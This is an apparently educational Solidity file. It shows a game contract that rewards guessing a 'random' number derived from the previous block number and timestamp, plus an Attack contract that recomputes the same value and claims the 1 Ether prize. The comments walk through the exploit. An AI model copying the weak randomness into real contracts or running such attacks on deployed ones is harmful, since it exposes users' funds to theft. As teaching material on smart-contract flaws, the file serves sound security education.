// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10; 



/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/


contract Randomness
{
   

   constructor() payable{}

   function guess(uint _value) public
   {
       uint value = uint(keccak256(abi.encodePacked(block.number-1,block.timestamp)));
       require(value == _value , "or else it is a wrong guess");
       (bool result ,) = payable(msg.sender).call{value: 1 ether}("");
       require(result,"Ether transfe failed");
   }

   



}

contract Attack
{

  Randomness public random ; 

  fallback() external payable{}
  receive() external payable{}



  constructor (address _random) 
  {
      random = Randomness(_random);
  }

  function attack() public 
  {
    uint256 value = uint(keccak256(abi.encodePacked(block.number-1 , block.timestamp)));
    random.guess(value);
  }


  function getbalance() public view returns (uint256)
  {
      return address(this).balance ;  
  }



}
